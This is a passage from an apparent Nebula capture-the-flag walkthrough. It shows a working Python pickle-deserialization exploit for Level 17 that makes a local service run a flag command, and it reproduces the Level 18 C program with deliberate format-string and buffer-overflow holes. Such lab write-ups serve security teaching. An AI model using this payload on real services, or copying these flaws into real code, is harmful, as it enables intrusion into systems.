&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;'localhost'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10007&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
&lt;span class="n"&gt;sent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cos&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;system&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;(S'/bin/bash -c /bin/getflag &amp;gt; /tmp/f17pwned'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;tR&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;sent&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
&lt;span class="n"&gt;skt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I'll explain the pickle string a bit:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;code&gt;cos\nsystem&lt;/code&gt; resolves the classname and calls it&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(&lt;/code&gt; is the marker&lt;/li&gt;
&lt;li&gt;&lt;code&gt;S'/bin/bash -c /bin/getflag &amp;gt; /tmp/f17pwned'\n&lt;/code&gt; this is our command we want to run&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tR\n&lt;/code&gt; - &lt;code&gt;t&lt;/code&gt; puts the string onto the stack and &lt;code&gt;R&lt;/code&gt; pops this tuple and calls it, thus executing our lovingly crafted payload.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once run it looks like it worked so let's be sure&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level17&amp;#64;nebula:/tmp/flag17$&lt;/span&gt; cat ../f17pwned
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-18"&gt;
&lt;h2&gt;Level 18&lt;/h2&gt;
&lt;blockquote&gt;
Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;getopt.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;loggedin&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cp"&gt;#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)
&lt;/span&gt;
&lt;span class="cp"&gt;#define PWFILE &amp;quot;/home/flag18/password&amp;quot;
&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;FILE&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PWFILE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Unable to read password file %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PWFILE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
                &lt;span class="n"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strcmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;logged in successfully (with%s password file)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;out&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;notsupported&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;asprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;--&amp;gt; [%s] is unsupported at this current time.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;free&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;setuser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;unable to set user to '%s' -- not supported.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;d:v&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;switch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="sc"&gt;'d'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;optarg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;w+&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Unable to open %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;optarg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;setvbuf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;debugfile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_IONBF&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="sc"&gt;'v'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;dprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Starting up. Verbose level = %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

  &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;'\n'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;'\r'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;dvprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;got [%s] as input&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;login&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dvprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;attempting to login&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;logout&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;dvprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;attempting to start shell&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loggedin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
